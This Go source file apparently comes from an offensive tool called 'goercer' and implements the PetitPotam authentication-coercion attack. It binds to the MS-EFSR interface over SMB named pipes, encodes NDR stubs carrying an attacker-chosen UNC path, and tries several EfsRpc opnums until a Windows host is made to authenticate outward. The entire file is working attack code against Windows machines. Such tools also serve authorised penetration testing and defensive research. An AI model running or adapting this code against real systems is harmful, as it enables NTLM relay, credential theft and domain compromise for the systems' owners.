package coercer

import (
	"goercer/internal/config"
	"goercer/internal/dcerpc"
	"goercer/internal/ntlm"
	"goercer/internal/smbxport"
)

func init() {
	Register("petitpotam", func() Coercer { return &PetitPotam{} })
}

// PetitPotam coerces authentication via the MS-EFSR (EFS Remote) protocol open
// on a set of named pipes. It is the universal technique and works on
// Windows 10/11 and Server 2016-2025 via some combination of opnums.
type PetitPotam struct{}

// Name implements Coercer.
func (PetitPotam) Name() string { return "petitpotam" }

// Description implements Coercer.
func (PetitPotam) Description() string { return "PetitPotam (MS-EFSRPC)" }

var petitPotamOpnums = []uint16{0, 4, 5, 6, 7, 12}

var petitPotamOpnumNames = map[uint16]string{
	0:  "EfsRpcOpenFileRaw",
	4:  "EfsRpcEncryptFileSrv",
	5:  "EfsRpcDecryptFileSrv",
	6:  "EfsRpcQueryUsersOnFile",
	7:  "EfsRpcQueryRecoveryAgents",
	12: "EfsRpcFileKeyInfo",
}

func petitPotamOpnumName(op uint16) string {
	if n, ok := petitPotamOpnumNames[op]; ok {
		return n
	}
	return "Unknown"
}

// Execute implements Coercer.
func (p PetitPotam) Execute(sess *smbxport.Session, cfg *config.Config, out *Out) (*Result, error) {
	pipeName, uuid, major, minor := p.pipeSpec(cfg)
	bound, err := Bind(sess, cfg, out, pipeName, uuid, major, minor)
	if err != nil {
		return nil, err
	}
	defer bound.Close()

	opnums := p.selectOpnums(cfg)
	paths := Paths(cfg)

	attempted := make([]uint16, len(opnums))
	copy(attempted, opnums)

	fire := func(op uint16, path string) (bool, error) {
		stub := efsRpcStub(path, op)
		err := dcerpc.Transaction(bound.Pipe, bound.Auth, op, stub)
		if dcerpc.IsCoercionSuccess(err) {
			return true, err
		}
		if err == nil {
			// Successful (non-fault) response: opnum 0 commonly reports
			// success when patched, so treat a clean exec as *likely* success
			// only for the more reliable opnums.
			return op != 0, err
		}
		return false, err
	}

	successful, lastErr := runOpnums(cfg, paths, out, opnums, petitPotamOpnumName, fire)
	res := newResult(cfg, successful, attempted, lastErr)
	if successful >= 0 {
		out.Info("[+] Coercion triggered via opnum %d", successful)
	} else if lastErr != nil {
		out.Info("[!] No opnum succeeded; last error: %v", lastErr)
	}
	return res, lastErr
}

// pipeSpec selects the named pipe and matching EFSR interface UUID.
func (PetitPotam) pipeSpec(cfg *config.Config) (pipeName, uuid string, major, minor uint16) {
	major, minor = 1, 0
	switch cfg.Pipe {
	case "efsrpc":
		return "efsrpc", "df1941c5-fe89-4e79-bf10-463657acf44d", major, minor
	default:
		// lsarpc, samr, netlogon, lsass expose EFSR under the legacy UUID.
		return cfg.Pipe, "c681d488-d850-11d0-8c52-00c04fd90f7e", major, minor
	}
}

func (PetitPotam) selectOpnums(cfg *config.Config) []uint16 {
	if cfg.Opnum >= 0 {
		return []uint16{uint16(cfg.Opnum)}
	}
	return petitPotamOpnums
}

// efsRpcStub builds the NDR stub for an MS-EFSRPC call. The parameter layout
// (conformant varying string) is shared across the family; some opnums add a
// trailing DWORD.
func efsRpcStub(uncPath string, opnum uint16) []byte {
	var trail int
	switch opnum {
	case 0, 5, 12:
		trail = 1
	case 4, 6, 7:
		trail = 0
	}
	return uint16StringStub(uncPath, trail)
}

// uint16StringStub encodes a conformant varying Unicode string with an
// optional trailing DWORD, NDR style.
func uint16StringStub(s string, trailingDwords int) []byte {
	utf16 := ntlm.UTF16LE(s)
	length := uint32(len([]rune(s)))

	buf := writeU32(length)                // Max count
	buf = append(buf, writeU32(0)...)      // Offset
	buf = append(buf, writeU32(length)...) // Actual count
	buf = append(buf, utf16...)

	// Pad to 4-byte alignment.
	for (len(buf) % 4) != 0 {
		buf = append(buf, 0x00)
	}

	for i := 0; i < trailingDwords; i++ {
		buf = append(buf, 0, 0, 0, 0)
	}
	return buf
}

func writeU32(v uint32) []byte {
	return []byte{byte(v), byte(v >> 8), byte(v >> 16), byte(v >> 24)}
}
